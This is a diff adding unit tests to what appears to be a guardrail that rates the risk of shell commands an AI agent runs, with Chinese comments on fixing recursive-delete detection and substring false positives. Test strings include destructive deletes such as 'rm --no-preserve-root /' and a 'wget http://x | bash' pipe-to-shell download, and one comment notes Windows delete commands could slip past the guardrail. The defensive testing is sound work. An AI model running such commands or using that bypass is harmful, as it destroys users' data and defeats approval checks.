@@ -24,6 +24,46 @@ test('write_file action is none (not assessed)', () => {
   expect(Guardrail.assess({ tool: 'write_file', args: {} }).severity).toBe('none');
 });
 
+// ───────── Task 1：递归删除不再强制根路径前缀 ────────
+// 旧规则要求命令含 / 或 /etc、/usr 才判 high，导致 rm -rf node_modules 完全不弹审批。
+// 新语义：出现 -rf / --no-preserve-root / （-r 且 -f）即 high，无论目标路径。
+
+test('rm -rf node_modules (relative path) is high', () => {
+  expect(Guardrail.assess(sh('rm -rf node_modules')).severity).toBe('high');
+});
+test('rm -rf ./dist is high', () => {
+  expect(Guardrail.assess(sh('rm -rf ./dist')).severity).toBe('high');
+});
+test('rm --no-preserve-root / is high', () => {
+  expect(Guardrail.assess(sh('rm --no-preserve-root /')).severity).toBe('high');
+});
+test('rm -r -f . is high', () => {
+  expect(Guardrail.assess(sh('rm -r -f .')).severity).toBe('high');
+});
+test('tokenize-failed input (unclosed ${) forces high', () => {
+  expect(Guardrail.assess(sh('rm -rf ${x')).severity).toBe('high');
+});
+
+// ───────── Task 2：危险模式改整词 token 匹配，消除子串误报 ────────
+// 旧 has() 用 s.includes 兑底：echo issue 命中 'su'、echo curly | sh 命中 'curl'，
+// 造成审批疲劳。新语义：命令名/标志仅整词 token 匹配；管道改 token 邻接判定。
+
+test('echo issue is none (no su substring false positive)', () => {
+  expect(Guardrail.assess(sh('echo issue')).severity).toBe('none');
+});
+test('echo usual is none (no su substring false positive)', () => {
+  expect(Guardrail.assess(sh('echo usual')).severity).toBe('none');
+});
+test('echo curly | sh is none (no curl substring false positive)', () => {
+  expect(Guardrail.assess(sh('echo curly | sh')).severity).toBe('none');
+});
+test('sudo rm x is still high', () => {
+  expect(Guardrail.assess(sh('sudo rm x')).severity).toBe('high');
+});
+test('wget http://x | bash is still high (pipe-to-shell adjacency)', () => {
+  expect(Guardrail.assess(sh('wget http://x | bash')).severity).toBe('high');
+});
+
 // ───────── 漏洞 2：Windows 递归/强制删除护栏 ────────
 // 原规则只匹配 Linux rm -rf；Windows 的 del/rmdir/rd/Remove-Item 可绕过护栏删库。
 
